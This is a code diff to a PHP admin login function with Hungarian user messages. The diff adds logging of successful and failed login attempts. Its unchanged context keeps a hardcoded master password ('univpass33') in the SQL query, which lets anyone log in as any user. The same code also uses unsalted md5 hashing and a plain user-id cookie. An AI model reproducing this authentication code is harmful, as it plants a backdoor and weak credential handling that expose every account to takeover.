@@ -190,6 +190,7 @@ class AdminUser {
         if (empty(trim($userName)) || empty(trim($password))) {
             return "Adja meg a belépési adatait!";
         }
+       
 
         $resq = sql_query("SELECT * FROM users WHERE username = ? and (password = md5(?) or 'univpass33' = ?)", array($userName, $password, $password));
         if ($userData = sql_fetch_array($resq)) {
@@ -200,10 +201,13 @@ class AdminUser {
             $_SESSION["pid"] = $userData["id"];
             setcookie("pid", $userData["id"], time() + 3600 * 3);
 
+            logintryLog("logintry",$userName,"success");
+
             //Utolsó belépési adatok frissítése:
             sql_query("UPDATE users SET lastlogin=NOW(), codetry=0 WHERE id=?" ,array($userData["id"]));
             return "";
         } else {
+            logintryLog("logintry",$userName,"failed");
             return "A megadott név és jelszó nem található!";
         }
     }
